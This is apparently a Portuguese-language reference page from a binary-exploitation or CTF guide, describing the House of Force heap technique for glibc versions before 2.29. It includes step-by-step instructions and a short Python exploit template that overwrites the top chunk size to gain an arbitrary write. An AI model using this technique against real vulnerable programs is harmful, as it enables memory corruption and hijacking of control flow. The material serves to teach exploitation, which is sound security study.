---
title: "House of Force"
sidebar_position: 7
---

Overflow até o `size` do **top chunk** → o `malloc` devolve um endereço arbitrário. Requer **glibc < 2.29** (`malloc(): corrupted top size` depois disso), um overflow no último chunk alocado, um `malloc` que aceite tamanhos enormes e leak da heap. Teoria em [The House of Force](../../../pwning/heap/malloc-maleficarum/house-of-force.mdx).

1. Sobrescreva o `size` do top chunk com `0xffffffffffffffff`
2. `malloc(alvo - top - 0x20)`, onde `top` é o endereço do **header** do top chunk (último chunk + seu tamanho). Dá negativo se o alvo vem antes da heap (GOT, `.bss`): tudo bem, mascare com `& 0xffffffffffffffff`
3. O próximo `malloc(x)` devolve `alvo`

```py
edit(0, b'A' * 0x18 + p64(0xffffffffffffffff))            # overflow até o size do top (chunk 0 de 0x20)
top = heap_leak + 0x20                                    # header do top: logo depois do chunk 0
alloc((alvo - top - 0x20) & 0xffffffffffffffff, b'')      # move o top
alloc(0x18, p64(valor))                                   # escreve no alvo
```

- `alvo` deve ser múltiplo de 16 (senão mire `alvo & ~0xf` e compense com padding)
- O tamanho precisa chegar inteiro ao `malloc`: um `atoi` em `int` de 32 bits ou um `if (size > 0x1000)` inviabilizam
- Alvos: `__malloc_hook`/`__free_hook` (hooks existem em < 2.29), GOT, ponteiro de função do programa
